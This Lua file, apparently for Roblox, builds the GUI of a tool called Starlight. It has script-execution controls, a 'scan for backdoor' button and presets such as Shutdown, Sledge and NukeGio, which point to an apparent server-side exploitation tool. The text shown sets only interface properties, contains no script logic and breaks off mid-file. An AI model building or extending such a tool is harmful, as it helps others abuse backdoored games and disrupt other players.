-- starlight 💫
-- 0.2.7
























































































-- Instances:
local Converted = {
	["_Starlight"] = Instance.new("ScreenGui");
	["_Frame"] = Instance.new("Frame");
	["_UICorner"] = Instance.new("UICorner");
	["_UIStroke"] = Instance.new("UIStroke");
	["_ImageLabel"] = Instance.new("ImageLabel");
	["_stat"] = Instance.new("ImageLabel");
	["_Frame1"] = Instance.new("Frame");
	["_LocalScript"] = Instance.new("LocalScript");
	["_c"] = Instance.new("TextButton");
	["_UICorner1"] = Instance.new("UICorner");
	["_UIStroke1"] = Instance.new("UIStroke");
	["_ImageLabel1"] = Instance.new("ImageLabel");
	["_LocalScript1"] = Instance.new("LocalScript");
	["_Framee"] = Instance.new("Frame");
	["_Clear"] = Instance.new("TextButton");
	["_UICorner2"] = Instance.new("UICorner");
	["_UIStroke2"] = Instance.new("UIStroke");
	["_ImageLabel2"] = Instance.new("ImageLabel");
	["_LocalScript2"] = Instance.new("LocalScript");
	["_Execute"] = Instance.new("TextButton");
	["_UICorner3"] = Instance.new("UICorner");
	["_UIStroke3"] = Instance.new("UIStroke");
	["_ImageLabel3"] = Instance.new("ImageLabel");
	["_LocalScript3"] = Instance.new("LocalScript");
	["_scan"] = Instance.new("TextButton");
	["_UICorner4"] = Instance.new("UICorner");
	["_UIStroke4"] = Instance.new("UIStroke");
	["_LocalScript4"] = Instance.new("LocalScript");
	["_ImageLabel4"] = Instance.new("ImageLabel");
	["_Log"] = Instance.new("TextLabel");
	["_Check"] = Instance.new("TextLabel");
	["_rsix"] = Instance.new("TextButton");
	["_UICorner5"] = Instance.new("UICorner");
	["_UIStroke5"] = Instance.new("UIStroke");
	["_ImageLabel5"] = Instance.new("ImageLabel");
	["_LocalScript5"] = Instance.new("LocalScript");
	["_dc"] = Instance.new("TextButton");
	["_UICorner6"] = Instance.new("UICorner");
	["_UIStroke6"] = Instance.new("UIStroke");
	["_LocalScript6"] = Instance.new("LocalScript");
	["_ImageLabel6"] = Instance.new("ImageLabel");
	["_ScrollingFrame"] = Instance.new("ScrollingFrame");
	["_UIStroke7"] = Instance.new("UIStroke");
	["_UIListLayout"] = Instance.new("UIListLayout");
	["_Frame2"] = Instance.new("Frame");
	["_TextBox"] = Instance.new("TextBox");
	["_UICorner7"] = Instance.new("UICorner");
	["_LocalScript7"] = Instance.new("LocalScript");
	["_LocalScript8"] = Instance.new("LocalScript");
	["_TextLabel"] = Instance.new("TextLabel");
	["_LocalScript9"] = Instance.new("LocalScript");
	["_Presets"] = Instance.new("Frame");
	["_Log1"] = Instance.new("TextLabel");
	["_ScrollingFrame1"] = Instance.new("ScrollingFrame");
	["_UIListLayout1"] = Instance.new("UIListLayout");
	["_TextLabel1"] = Instance.new("TextLabel");
	["_CFour"] = Instance.new("TextButton");
	["_UICorner8"] = Instance.new("UICorner");
	["_UIStroke8"] = Instance.new("UIStroke");
	["_LocalScript10"] = Instance.new("LocalScript");
	["_Shutdown"] = Instance.new("TextButton");
	["_UICorner9"] = Instance.new("UICorner");
	["_UIStroke9"] = Instance.new("UIStroke");
	["_LocalScript11"] = Instance.new("LocalScript");
	["_Grab"] = Instance.new("TextButton");
	["_UICorner10"] = Instance.new("UICorner");
	["_UIStroke10"] = Instance.new("UIStroke");
	["_LocalScript12"] = Instance.new("LocalScript");
	["_Sledge"] = Instance.new("TextButton");
	["_UICorner11"] = Instance.new("UICorner");
	["_UIStroke11"] = Instance.new("UIStroke");
	["_LocalScript13"] = Instance.new("LocalScript");
	["_NukeGio"] = Instance.new("TextButton");
	["_UICorner12"] = Instance.new("UICorner");
	["_UIStroke12"] = Instance.new("UIStroke");
	["_LocalScript14"] = Instance.new("LocalScript");
	["_Destroui"] = Instance.new("TextButton");
	["_UICorner13"] = Instance.new("UICorner");
	["_UIStroke13"] = Instance.new("UIStroke");
	["_LocalScript15"] = Instance.new("LocalScript");
	["_TextLabel2"] = Instance.new("TextLabel");
	["_Trash"] = Instance.new("TextButton");
	["_UICorner14"] = Instance.new("UICorner");
	["_UIStroke14"] = Instance.new("UIStroke");
	["_LocalScript16"] = Instance.new("LocalScript");
	["_Polaria"] = Instance.new("TextButton");
	["_UICorner15"] = Instance.new("UICorner");
	["_UIStroke15"] = Instance.new("UIStroke");
	["_LocalScript17"] = Instance.new("LocalScript");
	["_Hub"] = Instance.new("TextButton");
	["_UICorner16"] = Instance.new("UICorner");
	["_UIStroke16"] = Instance.new("UIStroke");
	["_LocalScript18"] = Instance.new("LocalScript");
	["_TextLabel3"] = Instance.new("TextLabel");
	["_Star"] = Instance.new("TextButton");
	["_UICorner17"] = Instance.new("UICorner");
	["_UIStroke17"] = Instance.new("UIStroke");
	["_LocalScript19"] = Instance.new("LocalScript");
	["_ExSer"] = Instance.new("TextButton");
	["_UICorner18"] = Instance.new("UICorner");
	["_UIStroke18"] = Instance.new("UIStroke");
	["_LocalScript20"] = Instance.new("LocalScript");
	["_AntiSkidd"] = Instance.new("TextButton");
	["_UICorner19"] = Instance.new("UICorner");
	["_UIStroke19"] = Instance.new("UIStroke");
	["_LocalScript21"] = Instance.new("LocalScript");
	["_Logs"] = Instance.new("Frame");
	["_ScrollingFrame2"] = Instance.new("ScrollingFrame");
	["_Template"] = Instance.new("TextLabel");
	["_UIListLayout2"] = Instance.new("UIListLayout");
	["_UIStroke20"] = Instance.new("UIStroke");
	["_LocalScript22"] = Instance.new("LocalScript");
	["_Log2"] = Instance.new("TextLabel");
	["_Log3"] = Instance.new("TextLabel");
	["_ToggleMode"] = Instance.new("TextButton");
	["_UICorner20"] = Instance.new("UICorner");
	["_UIStroke21"] = Instance.new("UIStroke");
	["_LocalScript23"] = Instance.new("LocalScript");
	["_Version"] = Instance.new("TextLabel");
	["_BG"] = Instance.new("TextButton");
	["_UICorner21"] = Instance.new("UICorner");
	["_UIStroke22"] = Instance.new("UIStroke");
	["_LocalScript24"] = Instance.new("LocalScript");
	["_Devs"] = Instance.new("TextLabel");
	["_Sidebar"] = Instance.new("Frame");
	["_Executor"] = Instance.new("TextButton");
	["_UICorner22"] = Instance.new("UICorner");
	["_UIStroke23"] = Instance.new("UIStroke");
	["_ImageLabel7"] = Instance.new("ImageLabel");
	["_LocalScript25"] = Instance.new("LocalScript");
	["_Presets1"] = Instance.new("TextButton");
	["_UICorner23"] = Instance.new("UICorner");
	["_UIStroke24"] = Instance.new("UIStroke");
	["_ImageLabel8"] = Instance.new("ImageLabel");
	["_LocalScript26"] = Instance.new("LocalScript");
	["_Logs1"] = Instance.new("TextButton");
	["_UICorner24"] = Instance.new("UICorner");
	["_UIStroke25"] = Instance.new("UIStroke");
	["_ImageLabel9"] = Instance.new("ImageLabel");
	["_LocalScript27"] = Instance.new("LocalScript");
	["_Line"] = Instance.new("ImageLabel");
	["_Verify"] = Instance.new("Frame");
	["_Verify1"] = Instance.new("TextLabel");
	["_Verify2"] = Instance.new("TextLabel");
	["_TextBox1"] = Instance.new("TextBox");
	["_Btn"] = Instance.new("TextButton");
	["_UICorner25"] = Instance.new("UICorner");
	["_UIStroke26"] = Instance.new("UIStroke");
	["_LocalScript28"] = Instance.new("LocalScript");
	["_m"] = Instance.new("TextButton");
	["_UICorner26"] = Instance.new("UICorner");
	["_UIStroke27"] = Instance.new("UIStroke");
	["_ImageLabel10"] = Instance.new("ImageLabel");
	["_LocalScript29"] = Instance.new("LocalScript");
	["_LocalScript30"] = Instance.new("LocalScript");
	["_bg"] = Instance.new("ImageLabel");
	["_UICorner27"] = Instance.new("UICorner");
	["_UIStroke28"] = Instance.new("UIStroke");
	["_LocalScript31"] = Instance.new("LocalScript");
	["_Notification"] = Instance.new("Frame");
	["_UIStroke29"] = Instance.new("UIStroke");
	["_UICorner28"] = Instance.new("UICorner");
	["_Title"] = Instance.new("TextLabel");
	["_Desc"] = Instance.new("TextLabel");
	["_str"] = Instance.new("ImageButton");
	["_LocalScript32"] = Instance.new("LocalScript");
	["_LocalScript33"] = Instance.new("LocalScript");
	["_UIStroke30"] = Instance.new("UIStroke");
	["_UICorner29"] = Instance.new("UICorner");
}

-- Properties:

Converted["_Starlight"].DisplayOrder = 999
Converted["_Starlight"].IgnoreGuiInset = true
Converted["_Starlight"].ScreenInsets = Enum.ScreenInsets.DeviceSafeInsets
Converted["_Starlight"].ResetOnSpawn = false
Converted["_Starlight"].ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Converted["_Starlight"].Name = "Starlight"
Converted["_Starlight"].Parent = game:GetService("CoreGui")

Converted["_Frame"].AnchorPoint = Vector2.new(0.5, 0.5)
Converted["_Frame"].BackgroundColor3 = Color3.fromRGB(12.000000234693289, 12.000000234693289, 12.000000234693289)
Converted["_Frame"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Frame"].BorderSizePixel = 0
Converted["_Frame"].Position = UDim2.new(0.5, 0, 0.5, 0)
Converted["_Frame"].Size = UDim2.new(0, 621, 0, 353)
Converted["_Frame"].Parent = Converted["_Starlight"]

Converted["_UICorner"].CornerRadius = UDim.new(0, 6)
Converted["_UICorner"].Parent = Converted["_Frame"]

Converted["_UIStroke"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
Converted["_UIStroke"].Color = Color3.fromRGB(89.00000229477882, 89.00000229477882, 89.00000229477882)
Converted["_UIStroke"].Thickness = 0.699999988079071
Converted["_UIStroke"].Parent = Converted["_Frame"]

Converted["_ImageLabel"].Image = "rbxassetid://138561242127995"
Converted["_ImageLabel"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_ImageLabel"].BackgroundTransparency = 1
Converted["_ImageLabel"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_ImageLabel"].BorderSizePixel = 0
Converted["_ImageLabel"].Position = UDim2.new(0.0159850847, 0, 0.0399873629, 0)
Converted["_ImageLabel"].Size = UDim2.new(0, 169, 0, 60)
Converted["_ImageLabel"].Parent = Converted["_Frame"]

Converted["_stat"].Image = "rbxassetid://7442093008"
Converted["_stat"].ImageColor3 = Color3.fromRGB(226.0000017285347, 69.00000348687172, 69.00000348687172)
Converted["_stat"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_stat"].BackgroundTransparency = 1
Converted["_stat"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_stat"].BorderSizePixel = 0
Converted["_stat"].Position = UDim2.new(0.00700000022, 1, 0.822000027, 0)
Converted["_stat"].Size = UDim2.new(0, 50, 0, 50)
Converted["_stat"].Name = "stat"
Converted["_stat"].Parent = Converted["_Frame"]

Converted["_Frame1"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Frame1"].BackgroundTransparency = 1
Converted["_Frame1"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Frame1"].BorderSizePixel = 0
Converted["_Frame1"].Size = UDim2.new(0, 621, 0, 84)
Converted["_Frame1"].Parent = Converted["_Frame"]

Converted["_c"].Font = Enum.Font.SourceSans
Converted["_c"].Text = ""
Converted["_c"].TextColor3 = Color3.fromRGB(0, 0, 0)
Converted["_c"].TextSize = 14
Converted["_c"].AutoButtonColor = false
Converted["_c"].BackgroundColor3 = Color3.fromRGB(16.000000946223736, 16.000000946223736, 16.000000946223736)
Converted["_c"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_c"].BorderSizePixel = 0
Converted["_c"].Position = UDim2.new(0.912773371, 0, 0.0629773885, 0)
Converted["_c"].Size = UDim2.new(0, 42, 0, 42)
Converted["_c"].Name = "c"
Converted["_c"].Parent = Converted["_Frame"]

Converted["_UICorner1"].CornerRadius = UDim.new(0, 6)
Converted["_UICorner1"].Parent = Converted["_c"]

Converted["_UIStroke1"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
Converted["_UIStroke1"].Color = Color3.fromRGB(57.00000040233135, 57.00000040233135, 57.00000040233135)
Converted["_UIStroke1"].Thickness = 1.5
Converted["_UIStroke1"].Parent = Converted["_c"]

Converted["_ImageLabel1"].Image = "rbxassetid://12953907125"
Converted["_ImageLabel1"].ImageColor3 = Color3.fromRGB(144.00000661611557, 144.00000661611557, 144.00000661611557)
Converted["_ImageLabel1"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_ImageLabel1"].BackgroundTransparency = 1
Converted["_ImageLabel1"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_ImageLabel1"].BorderSizePixel = 0
Converted["_ImageLabel1"].Interactable = false
Converted["_ImageLabel1"].Position = UDim2.new(0.0714285746, 0, 0.0714285746, 0)
Converted["_ImageLabel1"].Size = UDim2.new(0, 35, 0, 35)
Converted["_ImageLabel1"].Parent = Converted["_c"]

Converted["_Framee"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Framee"].BackgroundTransparency = 1
Converted["_Framee"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Framee"].BorderSizePixel = 0
Converted["_Framee"].Position = UDim2.new(0, 0, 0.218954206, 0)
Converted["_Framee"].Size = UDim2.new(0, 621, 0, 275)
Converted["_Framee"].Name = "Framee"
Converted["_Framee"].Parent = Converted["_Frame"]

Converted["_Clear"].Font = Enum.Font.SourceSans
Converted["_Clear"].Text = ""
Converted["_Clear"].TextColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Clear"].TextSize = 14
Converted["_Clear"].AutoButtonColor = false
Converted["_Clear"].BackgroundColor3 = Color3.fromRGB(16.000000946223736, 16.000000946223736, 16.000000946223736)
Converted["_Clear"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Clear"].BorderSizePixel = 0
Converted["_Clear"].Position = UDim2.new(0.214766204, 0, 0.805195093, 0)
Converted["_Clear"].Size = UDim2.new(0, 42, 0, 42)
Converted["_Clear"].Name = "Clear"
Converted["_Clear"].Parent = Converted["_Framee"]

Converted["_UICorner2"].CornerRadius = UDim.new(0, 6)
Converted["_UICorner2"].Parent = Converted["_Clear"]

Converted["_UIStroke2"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
Converted["_UIStroke2"].Color = Color3.fromRGB(57.00000040233135, 57.00000040233135, 57.00000040233135)
Converted["_UIStroke2"].Thickness = 1.5
Converted["_UIStroke2"].Parent = Converted["_Clear"]

Converted["_ImageLabel2"].Image = "rbxassetid://16346922164"
Converted["_ImageLabel2"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_ImageLabel2"].BackgroundTransparency = 1
Converted["_ImageLabel2"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_ImageLabel2"].BorderSizePixel = 0
Converted["_ImageLabel2"].Interactable = false
Converted["_ImageLabel2"].Position = UDim2.new(0.0714285746, 0, 0.0714285746, 0)
Converted["_ImageLabel2"].Size = UDim2.new(0, 35, 0, 35)
Converted["_ImageLabel2"].Parent = Converted["_Clear"]

Converted["_Execute"].Font = Enum.Font.SourceSans
Converted["_Execute"].Text = ""
Converted["_Execute"].TextColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Execute"].TextSize = 14
Converted["_Execute"].AutoButtonColor = false
Converted["_Execute"].BackgroundColor3 = Color3.fromRGB(16.000000946223736, 16.000000946223736, 16.000000946223736)
Converted["_Execute"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Execute"].BorderSizePixel = 0
Converted["_Execute"].Position = UDim2.new(0.117992014, 0, 0.801558733, 0)
Converted["_Execute"].Size = UDim2.new(0, 42, 0, 42)
Converted["_Execute"].Name = "Execute"
Converted["_Execute"].Parent = Converted["_Framee"]

Converted["_UICorner3"].CornerRadius = UDim.new(0, 6)
Converted["_UICorner3"].Parent = Converted["_Execute"]

Converted["_UIStroke3"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
Converted["_UIStroke3"].Color = Color3.fromRGB(57.00000040233135, 57.00000040233135, 57.00000040233135)
Converted["_UIStroke3"].Thickness = 1.5
Converted["_UIStroke3"].Parent = Converted["_Execute"]

Converted["_ImageLabel3"].Image = "rbxassetid://7980684777"
Converted["_ImageLabel3"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_ImageLabel3"].BackgroundTransparency = 1
Converted["_ImageLabel3"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_ImageLabel3"].BorderSizePixel = 0
Converted["_ImageLabel3"].Interactable = false
Converted["_ImageLabel3"].Position = UDim2.new(0.0714285746, 0, 0.0714285746, 0)
Converted["_ImageLabel3"].Rotation = 90
Converted["_ImageLabel3"].Size = UDim2.new(0, 35, 0, 35)
Converted["_ImageLabel3"].Parent = Converted["_Execute"]

Converted["_scan"].Font = Enum.Font.Ubuntu
Converted["_scan"].Text = ""
Converted["_scan"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_scan"].TextSize = 30
Converted["_scan"].TextWrapped = true
Converted["_scan"].AutoButtonColor = false
Converted["_scan"].BackgroundColor3 = Color3.fromRGB(16.000000946223736, 16.000000946223736, 16.000000946223736)
Converted["_scan"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_scan"].BorderSizePixel = 0
Converted["_scan"].Position = UDim2.new(0.916352272, 0, 0.801558733, 0)
Converted["_scan"].Size = UDim2.new(0, 42, 0, 42)
Converted["_scan"].Name = "scan"
Converted["_scan"].Parent = Converted["_Framee"]

Converted["_UICorner4"].CornerRadius = UDim.new(0, 6)
Converted["_UICorner4"].Parent = Converted["_scan"]

Converted["_UIStroke4"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
Converted["_UIStroke4"].Color = Color3.fromRGB(57.00000040233135, 57.00000040233135, 57.00000040233135)
Converted["_UIStroke4"].Thickness = 1.5
Converted["_UIStroke4"].Parent = Converted["_scan"]

Converted["_ImageLabel4"].Image = "rbxassetid://115736032752379"
Converted["_ImageLabel4"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_ImageLabel4"].BackgroundTransparency = 1
Converted["_ImageLabel4"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_ImageLabel4"].BorderSizePixel = 0
Converted["_ImageLabel4"].Interactable = false
Converted["_ImageLabel4"].Position = UDim2.new(0.142857149, 0, 0.142857149, 0)
Converted["_ImageLabel4"].Size = UDim2.new(0, 30, 0, 30)
Converted["_ImageLabel4"].Parent = Converted["_scan"]

Converted["_Log"].Font = Enum.Font.SourceSans
Converted["_Log"].Text = "backdoor: none"
Converted["_Log"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Log"].TextScaled = true
Converted["_Log"].TextSize = 15
Converted["_Log"].TextStrokeTransparency = 0
Converted["_Log"].TextWrapped = true
Converted["_Log"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Log"].BackgroundTransparency = 1
Converted["_Log"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Log"].BorderSizePixel = 0
Converted["_Log"].Position = UDim2.new(0.611762941, 0, 0.797922373, 0)
Converted["_Log"].Size = UDim2.new(0, 231, 0, 42)
Converted["_Log"].Visible = false
Converted["_Log"].Name = "Log"
Converted["_Log"].Parent = Converted["_Framee"]

Converted["_Check"].Font = Enum.Font.Ubuntu
Converted["_Check"].Text = "scanning for backdoor..."
Converted["_Check"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Check"].TextScaled = true
Converted["_Check"].TextSize = 50
Converted["_Check"].TextStrokeTransparency = 0
Converted["_Check"].TextWrapped = true
Converted["_Check"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Check"].BackgroundTransparency = 1
Converted["_Check"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Check"].BorderSizePixel = 0
Converted["_Check"].Position = UDim2.new(0.622718871, 0, 0.805531979, 0)
Converted["_Check"].Size = UDim2.new(0, 222, 0, 41)
Converted["_Check"].Visible = false
Converted["_Check"].Name = "Check"
Converted["_Check"].Parent = Converted["_Framee"]

Converted["_rsix"].Font = Enum.Font.Ubuntu
Converted["_rsix"].Text = "R6"
Converted["_rsix"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_rsix"].TextSize = 30
Converted["_rsix"].TextWrapped = true
Converted["_rsix"].AutoButtonColor = false
Converted["_rsix"].BackgroundColor3 = Color3.fromRGB(16.000000946223736, 16.000000946223736, 16.000000946223736)
Converted["_rsix"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_rsix"].BorderSizePixel = 0
Converted["_rsix"].Position = UDim2.new(0.411223531, 0, 0.805195212, 0)
Converted["_rsix"].Size = UDim2.new(0, 62, 0, 42)
Converted["_rsix"].Name = "rsix"
Converted["_rsix"].Parent = Converted["_Framee"]

Converted["_UICorner5"].CornerRadius = UDim.new(0, 6)
Converted["_UICorner5"].Parent = Converted["_rsix"]

Converted["_UIStroke5"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
Converted["_UIStroke5"].Color = Color3.fromRGB(57.00000040233135, 57.00000040233135, 57.00000040233135)
Converted["_UIStroke5"].Thickness = 1.5
Converted["_UIStroke5"].Parent = Converted["_rsix"]

Converted["_ImageLabel5"].Image = "rbxassetid://16346922164"
Converted["_ImageLabel5"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_ImageLabel5"].BackgroundTransparency = 1
Converted["_ImageLabel5"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_ImageLabel5"].BorderSizePixel = 0
Converted["_ImageLabel5"].Interactable = false
Converted["_ImageLabel5"].Position = UDim2.new(0.0714285746, 0, 0.0714285746, 0)
Converted["_ImageLabel5"].Size = UDim2.new(0, 35, 0, 35)
Converted["_ImageLabel5"].Visible = false
Converted["_ImageLabel5"].Parent = Converted["_rsix"]

Converted["_dc"].Font = Enum.Font.Ubuntu
Converted["_dc"].Text = ""
Converted["_dc"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_dc"].TextSize = 30
Converted["_dc"].TextWrapped = true
Converted["_dc"].AutoButtonColor = false
Converted["_dc"].BackgroundColor3 = Color3.fromRGB(16.000000946223736, 16.000000946223736, 16.000000946223736)
Converted["_dc"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_dc"].BorderSizePixel = 0
Converted["_dc"].Position = UDim2.new(0.310877174, 0, 0.805195093, 0)
Converted["_dc"].Size = UDim2.new(0, 42, 0, 42)
Converted["_dc"].Name = "dc"
Converted["_dc"].Parent = Converted["_Framee"]

Converted["_UICorner6"].CornerRadius = UDim.new(0, 6)
Converted["_UICorner6"].Parent = Converted["_dc"]

Converted["_UIStroke6"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
Converted["_UIStroke6"].Color = Color3.fromRGB(57.00000040233135, 57.00000040233135, 57.00000040233135)
Converted["_UIStroke6"].Thickness = 1.5
Converted["_UIStroke6"].Parent = Converted["_dc"]

Converted["_ImageLabel6"].Image = "rbxassetid://124991788631069"
Converted["_ImageLabel6"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_ImageLabel6"].BackgroundTransparency = 1
Converted["_ImageLabel6"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_ImageLabel6"].BorderSizePixel = 0
Converted["_ImageLabel6"].Interactable = false
Converted["_ImageLabel6"].Position = UDim2.new(0.0714285746, 0, 0.190476194, 0)
Converted["_ImageLabel6"].Size = UDim2.new(0, 35, 0, 26)
Converted["_ImageLabel6"].Parent = Converted["_dc"]

Converted["_ScrollingFrame"].AutomaticCanvasSize = Enum.AutomaticSize.Y
Converted["_ScrollingFrame"].CanvasSize = UDim2.new(0, 0, 5, 0)
Converted["_ScrollingFrame"].HorizontalScrollBarInset = Enum.ScrollBarInset.ScrollBar
Converted["_ScrollingFrame"].ScrollBarImageColor3 = Color3.fromRGB(106.00000888109207, 106.00000888109207, 106.00000888109207)
Converted["_ScrollingFrame"].Active = true
Converted["_ScrollingFrame"].BackgroundColor3 = Color3.fromRGB(12.000000234693289, 12.000000234693289, 12.000000234693289)
Converted["_ScrollingFrame"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_ScrollingFrame"].BorderSizePixel = 0
Converted["_ScrollingFrame"].Position = UDim2.new(0.117992066, 0, 0.074652873, 0)
Converted["_ScrollingFrame"].Size = UDim2.new(0, 536, 0, 189)
Converted["_ScrollingFrame"].Parent = Converted["_Framee"]

Converted["_UIStroke7"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
Converted["_UIStroke7"].Color = Color3.fromRGB(57.00000040233135, 57.00000040233135, 57.00000040233135)
Converted["_UIStroke7"].Thickness = 1.5
Converted["_UIStroke7"].Parent = Converted["_ScrollingFrame"]

Converted["_UIListLayout"].ItemLineAlignment = Enum.ItemLineAlignment.Start
Converted["_UIListLayout"].VerticalFlex = Enum.UIFlexAlignment.SpaceBetween
Converted["_UIListLayout"].Wraps = true
Converted["_UIListLayout"].SortOrder = Enum.SortOrder.LayoutOrder
Converted["_UIListLayout"].Parent = Converted["_ScrollingFrame"]

Converted["_Frame2"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Frame2"].BackgroundTransparency = 1
Converted["_Frame2"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Frame2"].BorderSizePixel = 0
Converted["_Frame2"].Position = UDim2.new(-5.69357788e-08, 0, -6.27513218, 0)
Converted["_Frame2"].Size = UDim2.new(0, 537, 0, 1375)
Converted["_Frame2"].Parent = Converted["_ScrollingFrame"]

Converted["_TextBox"].ClearTextOnFocus = false
Converted["_TextBox"].Font = Enum.Font.SourceSans
Converted["_TextBox"].MultiLine = true
Converted["_TextBox"].PlaceholderColor3 = Color3.fromRGB(12.000000234693289, 12.000000234693289, 12.000000234693289)
Converted["_TextBox"].RichText = true
Converted["_TextBox"].Text = ""
Converted["_TextBox"].TextColor3 = Color3.fromRGB(12.000000234693289, 12.000000234693289, 12.000000234693289)
Converted["_TextBox"].TextSize = 18
Converted["_TextBox"].TextTruncate = Enum.TextTruncate.SplitWord
Converted["_TextBox"].TextWrapped = true
Converted["_TextBox"].TextXAlignment = Enum.TextXAlignment.Left
Converted["_TextBox"].TextYAlignment = Enum.TextYAlignment.Top
Converted["_TextBox"].BackgroundColor3 = Color3.fromRGB(12.000000234693289, 12.000000234693289, 12.000000234693289)
Converted["_TextBox"].BackgroundTransparency = 1
Converted["_TextBox"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_TextBox"].BorderSizePixel = 0
Converted["_TextBox"].Position = UDim2.new(5.68297551e-08, 0, 0, 0)
Converted["_TextBox"].Size = UDim2.new(0, 537, 0, 1375)
Converted["_TextBox"].Parent = Converted["_Frame2"]

Converted["_UICorner7"].CornerRadius = UDim.new(0, 6)
Converted["_UICorner7"].Parent = Converted["_TextBox"]

Converted["_TextLabel"].Font = Enum.Font.Code
Converted["_TextLabel"].RichText = true
Converted["_TextLabel"].Text = "-- starlight"
Converted["_TextLabel"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_TextLabel"].TextSize = 18
Converted["_TextLabel"].TextTruncate = Enum.TextTruncate.AtEnd
Converted["_TextLabel"].TextWrapped = true
Converted["_TextLabel"].TextXAlignment = Enum.TextXAlignment.Left
Converted["_TextLabel"].TextYAlignment = Enum.TextYAlignment.Top
Converted["_TextLabel"].BackgroundColor3 = Color3.fromRGB(12.000000234693289, 12.000000234693289, 12.000000234693289)
Converted["_TextLabel"].BackgroundTransparency = 1
Converted["_TextLabel"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_TextLabel"].BorderSizePixel = 0
Converted["_TextLabel"].Interactable = false
Converted["_TextLabel"].Size = UDim2.new(0, 536, 0, 1376)
Converted["_TextLabel"].ZIndex = 2
Converted["_TextLabel"].Parent = Converted["_Frame2"]

Converted["_Presets"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Presets"].BackgroundTransparency = 1
Converted["_Presets"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Presets"].BorderSizePixel = 0
Converted["_Presets"].Position = UDim2.new(0, 0, 0.218954206, 0)
Converted["_Presets"].Size = UDim2.new(0, 621, 0, 275)
Converted["_Presets"].Visible = false
Converted["_Presets"].Name = "Presets"
Converted["_Presets"].Parent = Converted["_Frame"]

Converted["_Log1"].Font = Enum.Font.SourceSans
Converted["_Log1"].Text = "more scripts soon! suggest your script ideas in the server's #general!"
Converted["_Log1"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Log1"].TextScaled = true
Converted["_Log1"].TextSize = 15
Converted["_Log1"].TextStrokeTransparency = 0
Converted["_Log1"].TextWrapped = true
Converted["_Log1"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Log1"].BackgroundTransparency = 1
Converted["_Log1"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Log1"].BorderSizePixel = 0
Converted["_Log1"].Position = UDim2.new(0.118824929, 0, 0.860236824, 0)
Converted["_Log1"].Size = UDim2.new(0, 532, 0, 30)
Converted["_Log1"].Name = "Log"
Converted["_Log1"].Parent = Converted["_Presets"]

Converted["_ScrollingFrame1"].CanvasSize = UDim2.new(0, 0, 4, 0)
Converted["_ScrollingFrame1"].ScrollBarImageColor3 = Color3.fromRGB(197.00001865625381, 197.00001865625381, 197.00001865625381)
Converted["_ScrollingFrame1"].Active = true
Converted["_ScrollingFrame1"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_ScrollingFrame1"].BackgroundTransparency = 1
Converted["_ScrollingFrame1"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_ScrollingFrame1"].BorderSizePixel = 0
Converted["_ScrollingFrame1"].Position = UDim2.new(0.123993561, 0, 0.0836363658, 0)
Converted["_ScrollingFrame1"].Size = UDim2.new(0, 527, 0, 200)
Converted["_ScrollingFrame1"].Parent = Converted["_Presets"]

Converted["_UIListLayout1"].Padding = UDim.new(0, 5)
